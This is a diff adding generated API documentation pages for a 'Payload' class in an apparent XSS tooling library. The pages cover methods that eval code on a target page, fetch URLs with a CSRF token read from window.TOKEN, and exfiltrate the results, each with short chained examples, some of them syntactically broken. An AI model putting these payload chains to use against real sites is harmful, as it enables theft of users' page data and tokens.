+            <td class="type">
+            
+                
+<span class="param-type">any</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                    &lt;repeatable><br>
+                
+                </td>
+            
+
+            
+
+            <td class="description last"><p>arguments to bind to the function</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * This add a function to eval to the payload,\n     * the function take the value in the pipe as an argument named _\n     * the value returned by the function is then passed in the pipe\n     * @param {string|function|Payload} code_or_func  to eval on the target,\n     * if code_or_func is a function, then is converted to string.\n     * @param {...any} args arguments to bind to the function\n     * @graph $Payload -> {Any} ($current) {Any} -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .eval(()=>42)      # pipe value set to 42\n     *               .eval(x=>alert(x))  # alert 42\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[2024,2307],"filename":"Payload.js","lineno":63,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001349","name":"Payload#eval","type":"MethodDefinition","paramnames":["code_or_func","args"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>This add a function to eval to the payload,\nthe function take the value in the pipe as an argument named _\nthe value returned by the function is then passed in the pipe</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Any\",\"label\":\"eval(code_or_func, ...args)\",\"children\":null,\"returnType\":\"Any\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string","function","Payload"]},"description":"<p>to eval on the target,\nif code_or_func is a function, then is converted to string.</p>","name":"code_or_func"},{"type":{"names":["any"]},"variable":true,"description":"<p>arguments to bind to the function</p>","name":"args"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"eval(code_or_func, ...args)","children":null,"returnType":"Any"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .eval(()=>42)      # pipe value set to 42\n              .eval(x=>alert(x))  # alert 42\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"eval","longname":"Payload#eval","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000134","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"eval","signature":"<span class=\"signature\">(code_or_func, &hellip;args)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line270">270</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="exfiltrate">
+      <a href="#params-exfiltrate"><span class="type-signature"></span>exfiltrate</a><span class="signature">()</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Exfiltrate the current pipe value.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"exfiltrate()","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p new Payload()
+            .addExfiltrator(exfiltrators.message())
+            .eval(x=>42)
+            .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-exfiltrate">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Exfiltrate the current pipe value.\n    * @graph $Payload -> {Any} ($current) -> $Payload\n    * @example\n    * const p new Payload()\n    *             .addExfiltrator(exfiltrators.message())\n    *             .eval(x=>42)\n    *             .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[9495,9739],"filename":"Payload.js","lineno":270,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001732","name":"Payload#exfiltrate","type":"MethodDefinition","paramnames":["s"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Exfiltrate the current pipe value.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Any\",\"label\":\"exfiltrate()\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"exfiltrate()","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p new Payload()\n            .addExfiltrator(exfiltrators.message())\n            .eval(x=>42)\n            .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"exfiltrate","longname":"Payload#exfiltrate","kind":"function","memberof":"Payload","scope":"instance","params":[],"___id":"T000002R000153","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"exfiltrate","signature":"<span class=\"signature\">()</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line331">331</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="fetch">
+      <a href="#params-fetch"><span class="type-signature"></span>fetch</a><span class="signature">(url_or_func, options<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Fetch the supplied url, the response is then passed in the pipe. <br>
+<br>
+Most of the time <a href="Payload.html#fetchText"><code>fetchText</code></a>, <a href="Payload.html#fetchDOM"><code>fetchDOM</code></a>, <a href="Payload.html#fetchJSON"><code>fetchJSON</code></a> are what yout need</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetch(url_or_func, options={})","children":null,"returnType":"Response"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p new Payload()
+            .fetch("/")
+            .eval(r=>r.status)
+            .exfiltrate()
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p new Payload()
+              eval(()=> {
+                return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
+              })
+            .fetch()
+            .eval(r=>r.status)
+            .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-fetch">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-fetch" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>url_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+|
+
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                </td>
+            
+
+            <td class="description last"><p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>options</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">object</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    {}
+                
+                </td>
+            
+
+            <td class="description last"><p>Options passed to fetch (ignored if url_or_func is a function).</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Fetch the supplied url, the response is then passed in the pipe. <br>\n    * <br>\n    * Most of the time <a href="Payload.html#fetchText"><code>fetchText</code></a>, <a href="Payload.html#fetchDOM"><code>fetchDOM</code></a>, <a href="Payload.html#fetchJSON"><code>fetchJSON</code></a> are what yout need\n    * @param {string|function|Payload} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .\n    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).\n    * @graph $Payload -> {String | [String, Object]} ($current) {Response} -> $Payload\n    * @example\n    * const p new Payload()\n    *             .fetch(\"/\")\n    *             .eval(r=>r.status)\n    *             .exfiltrate()\n    *\n    * eval(p.run())\n    * @example\n    * const p new Payload()\n    *               eval(()=> {\n    *                 return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n    *               })\n    *             .fetch()\n    *             .eval(r=>r.status)\n    *             .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[11849,12349],"filename":"Payload.js","lineno":331,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001865","name":"Payload#fetch","type":"MethodDefinition","paramnames":["url_or_func","options"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Fetch the supplied url, the response is then passed in the pipe. <br>\n<br>\nMost of the time <a href="Payload.html#fetchText"><code>fetchText</code></a>, <a href="Payload.html#fetchDOM"><code>fetchDOM</code></a>, <a href="Payload.html#fetchJSON"><code>fetchJSON</code></a> are what yout need</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"String | [String, Object]\",\"label\":\"fetch(url_or_func, options={})\",\"children\":null,\"returnType\":\"Response\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string","function","Payload"]},"description":"<p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p>","name":"url_or_func"},{"type":{"names":["object"]},"optional":true,"defaultvalue":"{}","description":"<p>Options passed to fetch (ignored if url_or_func is a function).</p>","name":"options"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetch(url_or_func, options={})","children":null,"returnType":"Response"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p new Payload()\n            .fetch(\"/\")\n            .eval(r=>r.status)\n            .exfiltrate()\n\neval(p.run())"},{"caption":"","code":"const p new Payload()\n              eval(()=> {\n                return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n              })\n            .fetch()\n            .eval(r=>r.status)\n            .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"fetch","longname":"Payload#fetch","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000156","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"fetch","signature":"<span class=\"signature\">(url_or_func, options<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line396">396</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="fetchDOM">
+      <a href="#params-fetchDOM"><span class="type-signature"></span>fetchDOM</a><span class="signature">(url_or_func, options<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Fetch the supplied url, the response text is parsed as html and passed in the pipe.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetchDOM(url_or_func, options={})","children":null,"returnType":"Document"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchDOM("/")
+              .querySelector("title", "innerText")
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .eval(()=> {
+                  return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
+                })
+              .fetchDOM()
+              .querySelector("title", "innerText")
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-fetchDOM">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-fetchDOM" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>url_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+|
+
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                </td>
+            
+
+            <td class="description last"><p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>options</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">object</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    {}
+                
+                </td>
+            
+
+            <td class="description last"><p>Options passed to fetch (ignored if url_or_func is a function).</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Fetch the supplied url, the response text is parsed as html and passed in the pipe.\n    *\n    * @param {string|function|Payload} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .\n    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).\n    * @graph $Payload -> {String | [String, Object]} ($current) {Document} -> $Payload\n    * @example\n    * const p = Payload.new()\n    *               .fetchDOM(\"/\")\n    *               .querySelector(\"title\", \"innerText\")\n    *               .exfiltrate()\n    *\n    * eval(p.run())\n    * @example\n    * const p = Payload.new()\n    *               .eval(()=> {\n    *                   return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n    *                 })\n    *               .fetchDOM()\n    *               .querySelector(\"title\", \"innerText\")\n    *               .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[14449,14552],"filename":"Payload.js","lineno":396,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001973","name":"Payload#fetchDOM","type":"MethodDefinition","paramnames":["url_or_func","options"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Fetch the supplied url, the response text is parsed as html and passed in the pipe.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"String | [String, Object]\",\"label\":\"fetchDOM(url_or_func, options={})\",\"children\":null,\"returnType\":\"Document\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string","function","Payload"]},"description":"<p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p>","name":"url_or_func"},{"type":{"names":["object"]},"optional":true,"defaultvalue":"{}","description":"<p>Options passed to fetch (ignored if url_or_func is a function).</p>","name":"options"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetchDOM(url_or_func, options={})","children":null,"returnType":"Document"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchDOM(\"/\")\n              .querySelector(\"title\", \"innerText\")\n              .exfiltrate()\n\neval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .eval(()=> {\n                  return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n                })\n              .fetchDOM()\n              .querySelector(\"title\", \"innerText\")\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"fetchDOM","longname":"Payload#fetchDOM","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000159","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"fetchDOM","signature":"<span class=\"signature\">(url_or_func, options<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line425">425</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="fetchJSON">
+      <a href="#params-fetchJSON"><span class="type-signature"></span>fetchJSON</a><span class="signature">(url_or_func, options<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Fetch the supplied url, the response text is parsed as json and passed in the pipe.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetchJSON(url_or_func, options={})","children":null,"returnType":"Any"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchJSON("/")           # return a json object
+              .eval(obj => obj.msg)
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .eval(()=> {
+                  return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
+                })
+              .fetchJSON()
+              .eval(obj => obj.msg)
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-fetchJSON">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-fetchJSON" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>url_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+|
+
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                </td>
+            
+
+            <td class="description last"><p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>options</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">object</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    {}
+                
+                </td>
+            
+
+            <td class="description last"><p>Options passed to fetch (ignored if url_or_func is a function).</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n    * Fetch the supplied url, the response text is parsed as json and passed in the pipe.\n    *\n    * @graph $Payload -> {String | [String, Object]} ($current) {Any} -> $Payload\n    * @param {function|Payload|string} url_or_func URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .\n    * @param {object} [options={}] Options passed to fetch (ignored if url_or_func is a function).\n    * @example\n    * const p = Payload.new()\n    *               .fetchJSON(\"/\")           # return a json object\n    *               .eval(obj => obj.msg)\n    *               .exfiltrate()\n    *\n    * eval(p.run())\n    * @example\n    * const p = Payload.new()\n    *               .eval(()=> {\n    *                   return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n    *                 })\n    *               .fetchJSON()\n    *               .eval(obj => obj.msg)\n    *               .exfiltrate()\n    *\n    * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[15610,15722],"filename":"Payload.js","lineno":425,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001991","name":"Payload#fetchJSON","type":"MethodDefinition","paramnames":["url_or_func","options"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Fetch the supplied url, the response text is parsed as json and passed in the pipe.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"String | [String, Object]\",\"label\":\"fetchJSON(url_or_func, options={})\",\"children\":null,\"returnType\":\"Any\"},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetchJSON(url_or_func, options={})","children":null,"returnType":"Any"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"params":[{"type":{"names":["function","Payload","string"]},"description":"<p>URL to fetch or function that return either an url or an array of [url, options] to pass to fetch .</p>","name":"url_or_func"},{"type":{"names":["object"]},"optional":true,"defaultvalue":"{}","description":"<p>Options passed to fetch (ignored if url_or_func is a function).</p>","name":"options"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchJSON(\"/\")           # return a json object\n              .eval(obj => obj.msg)\n              .exfiltrate()\n\neval(p.run())"},{"caption":"","code":"const p = Payload.new()\n              .eval(()=> {\n                  return [window.API_URL, {headers: {\"X-CSRF-TOKEN\": window.TOKEN}}]\n                })\n              .fetchJSON()\n              .eval(obj => obj.msg)\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"fetchJSON","longname":"Payload#fetchJSON","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000160","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"fetchJSON","signature":"<span class=\"signature\">(url_or_func, options<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line367">367</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="fetchText">
+      <a href="#params-fetchText"><span class="type-signature"></span>fetchText</a><span class="signature">(url_or_func, options<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Fetch the supplied url, the response text is then passed in the pipe.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"String | [String, Object]","label":"fetchText(url_or_func, options={})","children":null,"returnType":"String"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p new = Payload()
+              .fetchText("/")
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+    <pre class="prettyprint"><code>const p new = Payload()
+              .eval(()=> {
+                  return [window.API_URL, {headers: {"X-CSRF-TOKEN": window.TOKEN}}]
+                })
+              .fetchText()
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-fetchText">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
